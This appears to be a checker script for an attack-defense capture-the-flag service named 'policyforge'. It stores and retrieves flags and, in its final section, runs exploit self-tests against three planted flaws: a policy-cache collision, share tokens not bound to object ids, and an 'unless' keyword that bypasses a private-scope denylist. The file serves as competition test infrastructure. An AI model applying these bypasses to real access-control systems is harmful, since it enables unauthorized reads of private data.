from __future__ import annotations

import json
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher
from httpx import AsyncClient

from client import ensure_status, fetch_session, json_or_mumble, post_task, rnd


checker = Enochecker("policyforge", 8080)
app = lambda: checker.app


# -----------------------------------------------------------------------------
# variant 0 — incident object (policy decision cache collision)
# -----------------------------------------------------------------------------

@checker.putflag(0)
async def putflag_incident(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 0, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_incident: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 0:
        raise MumbleException("putflag_incident: wrong variant")
    for field in ("a", "b", "c"):
        if field not in info:
            raise MumbleException(f"putflag_incident: missing {field}")
    await db.set("v0", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(0)
async def getflag_incident(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v0")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_incident: flag drift")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        0,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )
    catalog = await client.get("/api/objects")
    await ensure_status(catalog, 200, "getflag_incident catalog")
    body = await json_or_mumble(catalog, "getflag_incident catalog")
    if not any(obj.get("id") == saved["info"]["a"] for obj in body.get("objects", [])):
        raise MumbleException("flag object missing from catalog")


# -----------------------------------------------------------------------------
# variant 1 — share-token (snapshot signature does not bind object id)
# -----------------------------------------------------------------------------

@checker.putflag(1)
async def putflag_share(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 1, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_share: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 1:
        raise MumbleException("putflag_share: wrong variant")
    await db.set("v1", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(1)
async def getflag_share(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v1")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_share: flag drift")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        1,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )
    issue = await client.get("/api/snapshot/share/issue", params={"snap": "public-snap"})
    await ensure_status(issue, 200, "getflag_share public issue")
    body = await json_or_mumble(issue, "getflag_share public issue")
    token = str(body.get("share_token", ""))
    if "." not in token or len(token) < 16:
        raise MumbleException("share token shape drift")
    public = await client.get(f"/api/snapshot/share/{token}/object/public-incident")
    await ensure_status(public, 200, "getflag_share public read")
    public_body = await json_or_mumble(public, "getflag_share public read")
    if not public_body.get("public"):
        raise MumbleException("public object not flagged public")


# -----------------------------------------------------------------------------
# variant 2 — audit record (DSL `unless` keyword bypasses denylist)
# -----------------------------------------------------------------------------

@checker.putflag(2)
async def putflag_audit(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    result = await post_task(client, "PUTFLAG", task.current_round_id, 2, flag=task.flag)
    info_raw = str(result.get("attack_info") or "")
    if not info_raw:
        raise MumbleException("putflag_audit: missing attack_info")
    info = json.loads(info_raw)
    if int(info.get("p", -1)) != 2:
        raise MumbleException("putflag_audit: wrong variant")
    await db.set("v2", {"info": info, "flag": task.flag})
    return info_raw


@checker.getflag(2)
async def getflag_audit(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    saved = await db.get("v2")
    if saved.get("flag") != task.flag:
        raise MumbleException("getflag_audit: flag drift")
    await post_task(
        client,
        "GETFLAG",
        task.current_round_id,
        2,
        flag=task.flag,
        attack_info=json.dumps(saved["info"]),
    )


# -----------------------------------------------------------------------------
# noise
# -----------------------------------------------------------------------------

@checker.putnoise(0)
async def putnoise_v0(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 0)


@checker.getnoise(0)
async def getnoise_v0(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 0)


@checker.putnoise(1)
async def putnoise_v1(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 1)


@checker.getnoise(1)
async def getnoise_v1(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 1)


@checker.putnoise(2)
async def putnoise_v2(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "PUTNOISE", task.current_round_id, 2)


@checker.getnoise(2)
async def getnoise_v2(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await post_task(client, "GETNOISE", task.current_round_id, 2)


# -----------------------------------------------------------------------------
# havoc — exercise the public surface
# -----------------------------------------------------------------------------

@checker.havoc(0)
async def havoc_health(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    health = await client.get("/health")
    await ensure_status(health, 200, "havoc health")
    whoami = await client.get("/whoami")
    await ensure_status(whoami, 200, "havoc whoami")


@checker.havoc(1)
async def havoc_session(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    await fetch_session(client)


@checker.havoc(2)
async def havoc_objects(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.get("/api/objects")
    await ensure_status(r, 200, "havoc objects")
    body = await json_or_mumble(r, "havoc objects")
    rows = body.get("objects") or []
    if not any(obj.get("id") == "public-incident" for obj in rows):
        raise MumbleException("public-incident missing from catalog")


@checker.havoc(3)
async def havoc_policy_eval(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    session = await fetch_session(client)
    r = await client.get(
        "/api/policy/eval",
        params={"session": session, "expr": "allow public::public-incident"},
    )
    await ensure_status(r, 200, "havoc policy eval public")
    body = await json_or_mumble(r, "havoc policy eval public")
    if body.get("decision") != "allow":
        raise MumbleException("policy eval allow public:: drift")
    r2 = await client.get(
        "/api/policy/eval",
        params={"session": session, "expr": "deny private::does-not-exist"},
    )
    await ensure_status(r2, 200, "havoc policy eval deny")
    body2 = await json_or_mumble(r2, "havoc policy eval deny")
    if body2.get("error") != "policy_scope_denied":
        raise MumbleException("private:: denylist drift")


@checker.havoc(4)
async def havoc_share_public(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    issue = await client.get("/api/snapshot/share/issue", params={"snap": "public-snap"})
    await ensure_status(issue, 200, "havoc share issue")
    body = await json_or_mumble(issue, "havoc share issue")
    token = str(body.get("share_token", ""))
    if "." not in token:
        raise MumbleException("share token shape drift")
    read = await client.get(f"/api/snapshot/share/{token}/object/public-incident")
    await ensure_status(read, 200, "havoc share read public")
    body2 = await json_or_mumble(read, "havoc share read public")
    if not body2.get("public"):
        raise MumbleException("share read public obj not public")


@checker.havoc(5)
async def havoc_snapshot(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.get("/api/snapshot/public-snap/object/public-incident", params={"tenant": "public"})
    await ensure_status(r, 200, "havoc snapshot read")
    body = await json_or_mumble(r, "havoc snapshot read")
    if body.get("id") != "public-incident":
        raise MumbleException("snapshot read drift")


# -----------------------------------------------------------------------------
# exploit self-tests
# -----------------------------------------------------------------------------

@checker.exploit(0)
async def exploit_incident(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 0:
        raise InternalErrorException("exploit_incident: wrong variant")
    session = await fetch_session(client)
    warmup = await client.get(f"/api/object/{info['b']}", params={"session": session})
    await ensure_status(warmup, 200, "exploit_incident warmup")
    target = await client.get(f"/api/object/{info['a']}", params={"session": session})
    await ensure_status(target, 200, "exploit_incident target")
    body = await json_or_mumble(target, "exploit_incident target")
    flag = searcher.search_flag(str(body.get("data", "")))
    if not flag:
        raise MumbleException("exploit_incident: flag missing from object body")
    return flag


@checker.exploit(1)
async def exploit_share(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 1:
        raise InternalErrorException("exploit_share: wrong variant")
    issue = await client.get("/api/snapshot/share/issue", params={"snap": "public-snap"})
    await ensure_status(issue, 200, "exploit_share issue")
    token = str((await json_or_mumble(issue, "exploit_share issue")).get("share_token", ""))
    if not token:
        raise MumbleException("exploit_share: missing share token")
    read = await client.get(f"/api/snapshot/share/{token}/object/{info['a']}")
    await ensure_status(read, 200, "exploit_share read")
    body = await json_or_mumble(read, "exploit_share read")
    flag = searcher.search_flag(str(body.get("data", "")))
    if not flag:
        raise MumbleException("exploit_share: flag missing from share read")
    return flag


@checker.exploit(2)
async def exploit_audit(
    task: ExploitCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    searcher: FlagSearcher,
) -> str:
    info = json.loads(task.attack_info)
    if int(info.get("p", -1)) != 2:
        raise InternalErrorException("exploit_audit: wrong variant")
    session = await fetch_session(client)
    suffix = rnd(4)
    expr = f"unless never-{suffix} allow private::{info['a']}"
    r = await client.get("/api/policy/eval", params={"session": session, "expr": expr})
    await ensure_status(r, 200, "exploit_audit eval")
    body = await json_or_mumble(r, "exploit_audit eval")
    obj = body.get("object") or {}
    flag = searcher.search_flag(str(obj.get("data", "")))
    if not flag:
        raise MumbleException("exploit_audit: flag missing from policy.eval body")
    return flag
